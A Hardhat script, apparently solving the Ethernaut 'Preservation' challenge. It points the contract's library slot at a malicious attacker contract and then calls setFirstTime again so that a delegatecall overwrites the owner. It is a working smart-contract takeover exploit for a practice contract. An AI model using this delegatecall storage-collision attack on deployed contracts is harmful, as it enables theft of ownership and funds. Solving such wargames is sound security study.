const { ethers } = require("hardhat");

async function main() {
  // attach your instance address
  const Instance = "0xe02F9a846388375d50d9Bebe3A2b15306EE139A8";
  const PreservationContract = await ethers.getContractFactory("Preservation");
  const Preservation = PreservationContract.attach(Instance);

  const AttackPreservationContract = await ethers.getContractFactory(
    "AttackPreservation"
  );
  const AttackPreservation = AttackPreservationContract.attach(
    "0x50f7B8389A0CaF5C1df59E226F7E6367dE55068F"
  );
  console.log(AttackPreservation.address);
  // update our malicious library
  await Preservation.setFirstTime("0x50f7B8389A0CaF5C1df59E226F7E6367dE55068F");
  const librayUpdated = await Preservation.timeZone1Library();
  console.log(librayUpdated, "libraryUpdated");
  //Attack
  console.log("Attacking");
  await Preservation.setFirstTime("0x50f7B8389A0CaF5C1df59E226F7E6367dE55068F");
  const newOwner = await Preservation.owner();
  console.log("newOwner is", newOwner);
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
